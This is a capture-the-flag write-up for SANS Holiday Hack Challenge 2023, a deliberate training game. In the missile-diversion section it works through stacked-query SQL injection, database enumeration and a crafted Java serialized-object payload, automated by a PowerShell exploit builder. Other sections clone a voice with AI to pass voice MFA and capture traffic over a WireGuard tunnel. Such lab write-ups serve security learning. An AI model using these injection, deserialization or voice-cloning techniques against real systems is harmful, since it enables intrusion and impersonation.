## door-access-speaker <img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-red.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-red.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-red.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-outline.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-outline.png" alt="drawing" width="20"/>

<!-- report-keep -->

### Objective

There's a door that needs opening on Space Island! Talk to Jewel Loggins there for more information.

<!-- report-keep -->

### Useful AI Prompts

- What AI tool can I use to generate an MP3 based on a real person's voice?

### Approach

This one is straight forward after Active Directory is solved, the secret file contains what needs to be said in the speaker:

"And he whispered, 'Now I shall be out of sight; So through the valley and over the height.' And he'll silently take his way."

The tricky part, is that it is required to be said in Wombley Cube's voice for MFA.
  
I went back to Space Island: Spaceport Point, as I noted down earlier in the challenge that Wombley Cube was there with an audio book. After downloading his audio book, I now have his voice. Searching the internet for AI voice creation, I found several sites that had the capabilities. After
trying a few and signing up for a few, I found one site [PlayHT](https://play.ht/) which allowed free users to do the things I needed. I created a new voice profile with Wombley's audio book,
and then used that voice to speak the passphrase. I tried a couple of times before it sounded correctly, and submitted the mp3 to the gate a few times with a few versions before I was successful.

### Resources

[PlayHT](https://play.ht/)

---

<!-- report-keep -->

## camera-access <img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-red.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-red.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-red.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-outline.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-outline.png" alt="drawing" width="20"/>

<!-- report-keep -->

### Objective

Gain access to Jack's camera. What's the third item on Jack's TODO list?

<!-- report-keep -->

### Useful AI Prompts

- How do I convert a base64 string to a file in PowerShell?

### Approach

Clicking timetravel on the computer in the room after opening the terminal by clicking the gator icon on Space Island:Zenith SGS gave me the following:

```
###BEGIN###
#### This is the server's Wireguard configuration file. Please consider saving it for your record. ###

[Interface]
Address = 10.1.1.1/24
PrivateKey = hgfQUFG9/9WYStqkyWvNJMJgDhg3jzc2pzs5cZHxyKI=
ListenPort = 51820

[Peer]
PublicKey = DOrGCAdYNuU/jchpTqhpkJwXtJtlBOjylOfUKaT4YnA=
AllowedIPs = 10.1.1.2/32


###END####

###BEGIN###
#### This is your Wireguard configuration file. Please save it, configure a local Wireguard client, and connect to the Target. ###

[Interface]
Address = 10.1.1.2/24
PrivateKey = lUysoOIYav1Uz7XVAmTwTs6hbpqPL2SVgCO4FNDfdWA=
ListenPort = 51820

[Peer]
PublicKey = gKm40CP2prXa8RzdflvXjXE9LgxX+wt24hla9bc9uXI=
Endpoint = 34.29.61.246:51820
AllowedIPs = 10.1.1.1/32


###END####
```

Next, I download the zip from the Ground station client vending machine, I found a readme.md file which I used to help setup my docker instance:

```bash
┌──(root㉿kali)-[~]
└─## cd /home/kali/Desktop/docker 
                                                                             
┌──(root㉿kali)-[/home/kali/Desktop/docker]
└─## ./build_and_run.sh 
```

Once my docker was set up, I VNC into it using vinagre:

```bash
┌──(kali㉿kali)-[/home/kali/Desktop/docker]
└─## vinagre localhost:5900
```

On this host, there is the CTT: Consumer Test Tool running.

To get things started, I had to configure wiregaurd according to the configuration file I received earlier on the GateXOR terminal, by right clicking the desktop, going to applications-shells-bash:

```bash
root@4cea098994cf:~## gedit /etc/wireguard/wg0.conf
root@4cea098994cf:~## wg-quick up wg0
root@4cea098994cf:~## wg show
```

Once that is complete, I right clicked the desktop where I found Satellite Tools -> Launch NanoSat MO Base Station Tool.  Pasting

```
maltcp://10.1.1.1:1024/nanosat-mo-supervisor-Directory
```

into the Directory Service URI and clicking
"Fetch Information" got me connected right away to the nanosat-mo-supervisor provider. After clicking 'Connect to selected Provider' I was able to go into the Apps Launcher service tab and start the camera app.
This gave me an info message of "INFO: URI: maltcp://10.1.1.1:1025/camera-Directory".

Next I went back to communication settings and after clicking "Fetch Information" again I now see app: Camera.  I connected to the app provider.  The only thing I see interesting there is
in the Action service tab - there is an action that "Uses the NMF Camera service to take a jpg picture". I submited that action.

At this point I thought about setting up wireshark on my Linux machine to capture the data, but knowing it's encrypted with wireguard I would need to set up some decryption. I decided it would be easier to just capture packets right at the CTT on the wg0 interface as they would then be decrypted. I found that the CTT already had Wireshark installed so I went to work.

I fired up wireshark on the wg0 interface on the CTT. In the capture, I got a packet that in the data had something about a Base64 image from the camera service. I saw that that stream comes every 10 seconds, so I ran the capture for longer than 10 seconds and saved it to the CTT. Now I can copy the file over to my Kali machine:

```bash
┌──(root㉿kali)-[/home/kali/Desktop/docker]
└─## docker ps                                             
CONTAINER ID   IMAGE        COMMAND                  CREATED         STATUS         PORTS                                                                                  NAMES
0181a4c2295e   nmf_client   "/__cacert_entrypoin…"   4 minutes ago   Up 4 minutes   0.0.0.0:5900->5900/tcp, :::5900->5900/tcp, 0.0.0.0:6901->6901/tcp, :::6901->6901/tcp   priceless_williamson
                                                                             
┌──(root㉿kali)-[/home/kali/Desktop/docker]
└─## docker cp 0181a4c2295e:/root/run.sh /home/kali/Desktop 
                                                                             
┌──(root㉿kali)-[/home/kali/Desktop/docker]
└─## docker cp 0181a4c2295e:/root/capture.pcapng /home/kali/Desktop

┌──(root㉿kali)-[/home/kali/Desktop/docker]
└─## chmod +rwx /home/kali/Desktop/capture.pcapng 
```

Next, I trimmed the capture down to just one stream of the file and from there used WireShark's "follow stream".  From the stream, I captured the base64 encoded jpg and converted it back through PowerShell:

```powershell
$base64 = '/9j/4AAQSkZJRgABA...<removed>....BigMBphujQf/9k='

$base64 = $base64.Replace("`r","")

$fileName = "$env:TEMP\image_camera_access.jpg"
$bytes = [Convert]::FromBase64String($base64)
[IO.File]::WriteAllBytes($filename, $bytes)
```

When I opened up the jpg, I was able to see the TODO list to finish the challenge!

![image](https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/camera-access.jpg)

### Resources

[nanosat docs](https://nanosat-mo-framework.readthedocs.io/en/latest/opssat/testing.html)

---

<!-- report-keep -->

## missile-diversion <img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-red.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-red.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-red.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-red.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-red.png" alt="drawing" width="20"/>

<!-- report-keep -->

### Objective

Thwart Jack's evil plan by re-aiming his missile at the Sun.

<!-- report-keep -->

### Useful AI Prompts

- How do I show databases on MariaDB?
- What type of file is indicated by the magic bytes "ACED"
- How do I show the permissions for my user in MariaDB?
- How do I select a colum as Hex from an object in a MariaDB?

### Approach

The setup of this is the same as camera access by setting up the docker container and setting up wireguard.

<!-- report-keep -->

Once that is complete, I right clicked the desktop where I found Satellite Tools -> Launch NanoSat MO Base Station Tool.  Pasting

```
maltcp://10.1.1.1:1024/nanosat-mo-supervisor-Directory
```

into the Directory Service URI and clicking
"Fetch Information" got me connected right away to the nanosat-mo-supervisor provider. After clicking 'Connect to selected Provider' I was able to go into the Apps Launcher service tab and start the Missile Targeting System app.  Once I start that app, I can do as I did back in the camera access challenge and fetch information and go to the Missile Targeting System app.

Once in the app, in the action service, I see an action to get debug information so I submit that action to see what I can receive.

Once I submit the action, I move to the Parameter service tab and use the getValue button to get the value of Debug.

```
rawValue: Version(): 11.2.2-MariaDB-1:11.2.2+maria~ubu2204
```

I run this again with a Wireshark capture to see if maybe there is any option for some SQL injection here. This time, prior to submitting the action, I edit the attributeValue to:

```
select databases();
```

In the Wireshark capture, I see the following:

```
2023-12-17 14:24:11.869 esa.mo.nmf.apps.MissileTargetingSystemMCAdapter sqlDebug
WARNING: Debug action query: SELECT VERSION()select database();
```

#### Initial Access
  
So I run the same process above but this time adding a semicolon before my sql query:

```
; select databases();
```

Now when I return to the parameter service and use getValue button on Debug, I receive results from my sql query:

![image](https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/missilediversion-1.png)

Now we're getting somewhere! Time to start surveying that database. Survey:

#### Discovery
  
```
; show databases;
SCHEMA_NAME: information_schema
SCHEMA_NAME: missile_targeting_system

; select user(), current_user();
user():targeter@172.18.0.3 | current_user(): targeter@%

; show grants;
Grants for targeter@%: GRANT USAGE ON *.* TO `targeter`@`%` IDENTIFIED BY PASSWORD '*41E2CFE844C8F1F375D5704992440920F11A11BA' | 
Grants for targeter@%: GRANT SELECT, INSERT ON `missile_targeting_system`.`satellite_query` TO `targeter`@`%` | 
Grants for targeter@%: GRANT SELECT ON `missile_targeting_system`.`pointing_mode` TO `targeter`@`%` | 
Grants for targeter@%: GRANT SELECT ON `missile_targeting_system`.`messaging` TO `targeter`@`%` | 
Grants for targeter@%: GRANT SELECT ON `missile_targeting_system`.`target_coordinates` TO `targeter`@`%` | 
Grants for targeter@%: GRANT SELECT ON `missile_targeting_system`.`pointing_mode_to_str` TO `targeter`@`%` | 

; use information_schema; select * from USER_PRIVILEGES;
GRANTEE: 'targeter'@'%' | TABLE_CATALOG: def | PRIVILEGE_TYPE: USAGE | IS_GRANTABLE: NO |

; show tables;
TABLE_NAME: messaging
TABLE_NAME: pointing_mode
TABLE_NAME: pointing_mode_to_str
TABLE_NAME: satellite_query
TABLE_NAME: target_coordinates

; select * from messaging;
id: 1 | msg_type: RedAlphaMsg | msg_data: RONCTTLA | 
id: 2 | msg_type: MsgAuth | msg_data: 220040DL | 
id: 3 | msg_type: LaunchCode | msg_data: DLG2209TVX | 
id: 4 | msg_type: LaunchOrder | msg_data: CONFIRMED | 
id: 5 | msg_type: TargetSelection | msg_data: CONFIRMED | 
id: 6 | msg_type: TimeOnTargetSequence | msg_data: COMPLETE | 
id: 7 | msg_type: YieldSelection | msg_data: COMPLETE | 
id: 8 | msg_type: MissileDownlink | msg_data: ONLINE | 
id: 9 | msg_type: TargetDownlinked | msg_data: FALSE |

; select * from pointing_mode
id: 1 | numerical_mode: 0 |

; select * from pointing_mode_to_str;
id: 1 | numerical_mode: 0 | str_mode: Earth Point Mode | str_desc: When pointing_mode is 0, targeting system applies the target_coordinates to earth. |
id: 2 | numerical_mode: 1 | str_mode: Sun Point Mode | str_desc: When pointing_mode is 1, targeting system points at the sun, ignoring the coordinates. |

; select * from satellite_query;
<this one has quite a large response, so I'm going to supress that for now>

; select * from target_coordinates;
id: 1 | lat: 1.14514 | lng: -145.262 |

; show triggers;
<none>
```

Response from the satellite_query table query:

```
jid: 1 | object: ??..sr..SatelliteQueryFileFolderUtility.???.???...Z..isQueryZ..isUpdateL..pathOrStatementt..Ljava/lang/String;xp..t.)/opt/SatelliteQueryFileFolderUtility.java | results:
import java.io.Serializable;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.util.stream.Collectors;
import java.util.stream.Stream;
import java.sql.*;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import com.google.gson.Gson;

public class SatelliteQueryFileFolderUtility implements Serializable {
    private String pathOrStatement;
    private boolean isQuery;
    private boolean isUpdate;

    public SatelliteQueryFileFolderUtility(String pathOrStatement, boolean isQuery, boolean isUpdate) {
        this.pathOrStatement = pathOrStatement;
        this.isQuery = isQuery;
        this.isUpdate = isUpdate;
    }

    public String getResults(Connection connection) {
        if (isQuery && connection != null) {
            if (!isUpdate) {
                try (PreparedStatement selectStmt = connection.prepareStatement(pathOrStatement);
                    ResultSet rs = selectStmt.executeQuery()) {
                    List<HashMap<String, String>> rows = new ArrayList<>();
                    while(rs.next()) {
                        HashMap<String, String> row = new HashMap<>();
                        for (int i = 1; i <= rs.getMetaData().getColumnCount(); i++) {
                            String key = rs.getMetaData().getColumnName(i);
                            String value = rs.getString(i);
                            row.put(key, value);
                        }
                        rows.add(row);
                    }
                    Gson gson = new Gson();
                    String json = gson.toJson(rows);
                    return json;
                } catch (SQLException sqle) {
                    return "SQL Error: " + sqle.toString();
                }
            } else {
                try (PreparedStatement pstmt = connection.prepareStatement(pathOrStatement)) {
                    pstmt.executeUpdate();
                    return "SQL Update completed.";
                } catch (SQLException sqle) {
                    return "SQL Error: " + sqle.toString();
                }
            }
        } else {
            Path path = Paths.get(pathOrStatement);
            try {
                if (Files.notExists(path)) {
                    return "Path does not exist.";
                } else if (Files.isDirectory(path)) {
                    // Use try-with-resources to ensure the stream is closed after use
                    try (Stream<Path> walk = Files.walk(path, 1)) { // depth set to 1 to list only immediate contents
                        return walk.skip(1) // skip the directory itself
                                .map(p -> Files.isDirectory(p) ? "D: " + p.getFileName() : "F: " + p.getFileName())
                                .collect(Collectors.joining("\n"));
                    }
                } else {
                    // Assume it's a readable file
                    return new String(Files.readAllBytes(path), StandardCharsets.UTF_8);
                }
            } catch (IOException e) {
                return "Error reading path: " + e.toString();
            }
        }
    }

    public String getpathOrStatement() {
        return pathOrStatement;
    }
}
```

#### Resource Development

Now that I have some surveying complete, time to craft my exploit. I need to change the missile system to point towards the sun, so essentially I need
to change the pointing_mode table row with id: 1 from numerical_mode: 0 to numerical_mode 1. I can't do this through another injected sql query,

```
; UPDATE pointing_mode SET numerical_mode=1 WHERE id=1;
```

because I don't have update grants on the pointing_mode table. Instead I'm going to look more into the satellite_query data since I know it is of type [blob](https://en.wikipedia.org/wiki/Object_storage) from my database survey phase:

```
; select hex(object) from satellite_query where jid=1;
```

Output:

```
ACED00057372001F536174656C6C697465517565727946696C65466F6C6465725574696C69747912D4F68D0EB392CB0200035A0007697351756572795A000869735570646174654C000F706174684F7253746174656D656E747400124C6A6176612F6C616E672F537472696E673B787000007400292F6F70742F536174656C6C697465517565727946696C65466F6C6465725574696C6974792E6A617661
```

Looking at the magic bytes above, I can see this is a [serialized java object](https://snyk.io/blog/serialization-and-deserialization-in-java/). Perhaps I can use the SatelliteQueryFileFolderUtility class by creating my own serialized object?

Instead of fighting with Java directly, as I don't have an IDE set up for Java, I searched around for any tools for Java serialized objects. I found [this tool](https://github.com/NickstaDB/SerializationDumper?tab=readme-ov-file) which dumps serialed objects into a more human readible form. By running this:

```java
java -jar %USERPROFILE%\Downloads\SerializationDumper-v1.13.jar ACED00057372001F536174656C6C697465517565727946696C65466F6C6465725574696C69747912D4F68D0EB392CB0200035A0007697351756572795A000869735570646174654C000F706174684F7253746174656D656E747400124C6A6176612F6C616E672F537472696E673B787000007400292F6F70742F536174656C6C697465517565727946696C65466F6C6465725574696C6974792E6A617661
```

I get an output of:

```
STREAM_MAGIC - 0xac ed
STREAM_VERSION - 0x00 05
Contents
  TC_OBJECT - 0x73
    TC_CLASSDESC - 0x72
      className
        Length - 31 - 0x00 1f
        Value - SatelliteQueryFileFolderUtility - 0x536174656c6c697465517565727946696c65466f6c6465725574696c697479
      serialVersionUID - 0x12 d4 f6 8d 0e b3 92 cb
      newHandle 0x00 7e 00 00
      classDescFlags - 0x02 - SC_SERIALIZABLE
      fieldCount - 3 - 0x00 03
      Fields
        0:
          Boolean - Z - 0x5a
          fieldName
            Length - 7 - 0x00 07
            Value - isQuery - 0x69735175657279
        1:
          Boolean - Z - 0x5a
          fieldName
            Length - 8 - 0x00 08
            Value - isUpdate - 0x6973557064617465
        2:
          Object - L - 0x4c
          fieldName
            Length - 15 - 0x00 0f
            Value - pathOrStatement - 0x706174684f7253746174656d656e74
          className1
            TC_STRING - 0x74
              newHandle 0x00 7e 00 01
              Length - 18 - 0x00 12
              Value - Ljava/lang/String; - 0x4c6a6176612f6c616e672f537472696e673b
      classAnnotations
        TC_ENDBLOCKDATA - 0x78
      superClassDesc
        TC_NULL - 0x70
    newHandle 0x00 7e 00 02
    classdata
      SatelliteQueryFileFolderUtility
        values
          isQuery
            (boolean)false - 0x00
          isUpdate
            (boolean)false - 0x00
          pathOrStatement
            (object)
              TC_STRING - 0x74
                newHandle 0x00 7e 00 03
                Length - 41 - 0x00 29
                Value - /opt/SatelliteQueryFileFolderUtility.java - 0x2f6f70742f536174656c6c697465517565727946696c65466f6c6465725574696c6974792e6a617661
```

The tool also has a very interesting feature to rebuild serilization streams. By saving the above output as a text file, I can edit it and rebuild it using the SerializationDumper tool. I made the following edits to the text file - isQuery, isUpdate, Length and Value:

<pre>
      SatelliteQueryFileFolderUtility
        values
          isQuery
            (boolean)<b>true - 0x01</b>
          isUpdate
            (boolean)<b>true - 0x01</b>
          pathOrStatement
            (object)
              TC_STRING - 0x74
                newHandle 0x00 7e 00 03
                Length - <b>52 - 0x00 34</b>
                Value - <b>UPDATE pointing_mode SET numerical_mode=1 WHERE id=1 - 0x55504441544520706f696e74696e675f6d6f646520534554206e756d65726963616c5f6d6f64653d312057484552452069643d31</b>
</pre>

A quick way to get these values in PowerShell:

```powershell
$string = 'UPDATE pointing_mode SET numerical_mode=1 WHERE id=1'

$hex = ""
$charArray = $string.ToCharArray()
Foreach ($element in $charArray) {
    $hex = $hex + [System.String]::Format("{0:X}", [System.Convert]::ToUInt32($element))
    }

Write-Output "Length - $($string.Length) - 0x00 $($string.Length.ToString('X'))"
Write-Output "Value - $string - 0x$hex"

<#
output:
Length - 52 - 0x00 34
Value - UPDATE pointing_mode SET numerical_mode=1 WHERE id=1 - 0x55504441544520706F696E74696E675F6D6F646520534554206E756D65726963616C5F6D6F64653D312057484552452069643D31
#>
```

All that is really needed is to update the hex, but just for better readability I also updated the text that goes along with the hex values. So my new file now looks like this:

```
STREAM_MAGIC - 0xac ed
STREAM_VERSION - 0x00 05
Contents
  TC_OBJECT - 0x73
    TC_CLASSDESC - 0x72
      className
        Length - 31 - 0x00 1f
        Value - SatelliteQueryFileFolderUtility - 0x536174656c6c697465517565727946696c65466f6c6465725574696c697479
      serialVersionUID - 0x12 d4 f6 8d 0e b3 92 cb
      newHandle 0x00 7e 00 00
      classDescFlags - 0x02 - SC_SERIALIZABLE
      fieldCount - 3 - 0x00 03
      Fields
        0:
          Boolean - Z - 0x5a
          fieldName
            Length - 7 - 0x00 07
            Value - isQuery - 0x69735175657279
        1:
          Boolean - Z - 0x5a
          fieldName
            Length - 8 - 0x00 08
            Value - isUpdate - 0x6973557064617465
        2:
          Object - L - 0x4c
          fieldName
            Length - 15 - 0x00 0f
            Value - pathOrStatement - 0x706174684f7253746174656d656e74
          className1
            TC_STRING - 0x74
              newHandle 0x00 7e 00 01
              Length - 18 - 0x00 12
              Value - Ljava/lang/String; - 0x4c6a6176612f6c616e672f537472696e673b
      classAnnotations
        TC_ENDBLOCKDATA - 0x78
      superClassDesc
        TC_NULL - 0x70
    newHandle 0x00 7e 00 02
    classdata
      SatelliteQueryFileFolderUtility
        values
          isQuery
            (boolean)true - 0x01
          isUpdate
            (boolean)true - 0x01
          pathOrStatement
            (object)
              TC_STRING - 0x74
                newHandle 0x00 7e 00 03
                Length - 52 - 0x00 34
                Value - UPDATE pointing_mode SET numerical_mode=1 WHERE id=1 - 0x55504441544520706f696e74696e675f6d6f646520534554206e756d65726963616c5f6d6f64653d312057484552452069643d31
```
  
Next, I saved it as SerializationDump.txt and ran the following:

```java
java -jar SerializationDumper-v1.13.jar -b SerializationDump.txt rebuilt.bin
```

Now that I have the rebuilt.bin serialized file, I just need the hex representation for that so I do that with PowerShell:

```powershell
## Get the file path
$filePath = "$env:USERPROFILE\Documents\HolidayHackChallenge\diversion\rebuilt.bin"

## Read the content of the file as a byte array
$fileBytes = Get-Content -Path $filePath -Encoding Byte

## Convert the byte array to a hex string
$hexString = $fileBytes | ForEach-Object { $_.ToString("X2") }

$trueString = ""
foreach ($element in $hexString) {
    $trueString += $element
}

Write-Output $trueString

<#
Output:
ACED00057372001F536174656C6C697465517565727946696C65466F6C6465725574696C69747912D4F68D0EB392CB0200035A0007697351756572795A000869735570646174654C000F706174684F7253746174656D656E747400124C6A6176612F6C616E672F537472696E673B7870010174003455504441544520706F696E74696E675F6D6F646520534554206E756D65726963616C5F6D6F64653D312057484552452069643D31
#>
```

#### Execution

And now I have my exploit:

```
; insert into satellite_query (object) values (X'ACED00057372001F536174656C6C697465517565727946696C65466F6C6465725574696C69747912D4F68D0EB392CB0200035A0007697351756572795A000869735570646174654C000F706174684F7253746174656D656E747400124C6A6176612F6C616E672F537472696E673B7870010174003455504441544520706F696E74696E675F6D6F646520534554206E756D65726963616C5F6D6F64653D312057484552452069643D31')
```

After running the exploit, querying the satellite_query table now gives me:

```
; select * from satellite_query;
id: 2 | object: ??..sr..SatelliteQueryFileFolderUtility.???.???...Z..isQueryZ..isUpdateL..pathOrStatementt..Ljava/lang/String;xp..t.4UPDATE pointing_mode SET numerical_mode=1 WHERE id=1 | results: SQL Update completed. |
```

Update successfully ran, and now when I look at the parameter service and run the getValue on PointingMode, I see:

![image](https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/missilediversion-2.png)

Glorrrryyyyyy!

![image](https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/missilediversion-3.png)

### Alternate approach

All in one script (must have Java installed)

```powershell
$serializationDumperRemotePath = "https://github.com/NickstaDB/SerializationDumper/releases/download/1.13/SerializationDumper-v1.13.jar"
$serializationDumperLocalPath = "$env:TEMP\SerializationDumper-v1.13.jar"
Invoke-WebRequest -Uri $serializationDumperRemotePath -OutFile $serializationDumperLocalPath

## get original java stream object in hex:
## ; select hex(object) from satellite_query where jid=1;
$originalBinHex = 'ACED00057372001F536174656C6C697465517565727946696C65466F6C6465725574696C69747912D4F68D0EB392CB0200035A0007697351756572795A000869735570646174654C000F706174684F7253746174656D656E747400124C6A6176612F6C616E672F537472696E673B787000007400292F6F70742F536174656C6C697465517565727946696C65466F6C6465725574696C6974792E6A617661'

#region dump stream using SerializationDumper.jar
$readableDump = java -jar "$serializationDumperLocalPath" "$originalBinHex"

## create new readable file with new values for stream
$isQuery = $true
$isUpdate = $true
$string = 'GRANT ALL PRIVILEGES ON `missile_targeting_system`.`pointing_mode` TO `targeter`@`%`'

$hex = ""
$charArray = $string.ToCharArray()
Foreach ($element in $charArray) {
    $hex = $hex + [System.String]::Format("{0:X}", [System.Convert]::ToUInt32($element))
    }

$newLength =  "                Length - $($string.Length) - 0x00 $($string.Length.ToString('X'))"
$newValue = "                Value - $string - 0x$hex"

## update the values
if ($isQuery) {
    $readableDump[43] = "            (boolean)true - 0x01"
    }

if ($isUpdate) {
    $readableDump[45] = "            (boolean)true - 0x01"
    }

$readableDump[50] = $newLength
$readableDump[51] = $newValue

$filePathReadableDumpTxt = "$env:TEMP\$(New-Guid).txt"
$filePathRebuildBin = "$env:TEMP\$(New-Guid).bin"

$readableDump | Out-File -FilePath $filePathReadableDumpTxt

#remove the first blank line from the file
(Get-Content $filePathReadableDumpTxt | Select-Object -Skip 1) | Set-Content $filePathReadableDumpTxt
#endregion

#region build the new binary file
$null = java -jar "$serializationDumperLocalPath" -b "$filePathReadableDumpTxt" "$filePathRebuildBin"
#endregion

#region convert the bin file into an exploit
## Read the content of the file as a byte array
$fileBytes = Get-Content -Path $filePathRebuildBin -Encoding Byte

## Convert the byte array to a hex string
$hexString = $fileBytes | ForEach-Object { $_.ToString("X2") }

$trueString = ""
foreach ($element in $hexString) {
    $trueString += $element
}

Write-Output "Expoit:"
Write-Output "; insert into satellite_query (object) values (X'$trueString')"
#endregion

#region cleanup
Remove-Item -Path $filePathReadableDumpTxt
Remove-Item -Path $filePathRebuildBin
Remove-Item -Path $serializationDumperLocalPath
#endregion
```

### Resources

[Henry Reed Space System Vulnerabilities](https://www.youtube.com/watch?v=qQaA1w6WjGw)

[Object Storage](https://en.wikipedia.org/wiki/Object_storage)

[Java Serialization](https://snyk.io/blog/serialization-and-deserialization-in-java/)

[Java Serialization Dumper](https://github.com/NickstaDB/SerializationDumper?tab=readme-ov-file)

---

<!-- report-keep -->

## bonus-fishing-mastery <img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-red.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-red.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-red.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-red.png" alt="drawing" width="20"/><img src="https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/tree-outline.png" alt="drawing" width="20"/>

<!-- report-keep -->

### Objective

Catch at least one of each species of fish that live around Geese islands. When you're done, report your findings to Poinsettia McMittens.

<!-- report-keep -->

### Useful AI Prompts

- How do I introduce a delay in a javascript loop?

### Approach

To automate fishing, I wrote a javascript loop to fish while I'm away. There are 171 total fish species.

```javascript
function loop() {
    if (castReelBtn.innerText == 'Cast Line' && castReelBtn.style.display != 'none') {
        castReelBtn.click();
    }
    setTimeout(function() {
        if (reelItInBtn.innerText == 'Reel it in!') {
            reelItInBtn.click()
            document.querySelector('.cotd button.closefeesh').click();
            var totalFish = playerData.fishCaught.length;
            console.log("Total Fish: " + totalFish);
        }
    loop();
    }, 300);
}
loop()
```

Additionally, I used the [fish density maps](https://2023.holidayhackchallenge.com/sea/fishdensityref.html) (found commented out in the source code) to help know where to catch the remaining fish.

If you would like to see a json representation of all the fish you have caught, simply right click on the ocean and click inspect.  Then in the Console, enter:

```console
> playerData.fishCaught
```
<!-- report-keep -->

### Alternative Approach

Websockets could also be used to simplify automation.

### Resources

[websockets](https://javascript.info/websocket)

[autokey](https://github.com/autokey/autokey)

[autoitscript](https://www.autoitscript.com/site/)

---

![image](https://raw.githubusercontent.com/FuzzyKittens/holiday-hack-challenge-2023/main/img/finale.png)

A more thorough report can be found at: **[https://fuzzykittens.github.io/holiday-hack-challenge-2023](https://fuzzykittens.github.io/holiday-hack-challenge-2023)**

---
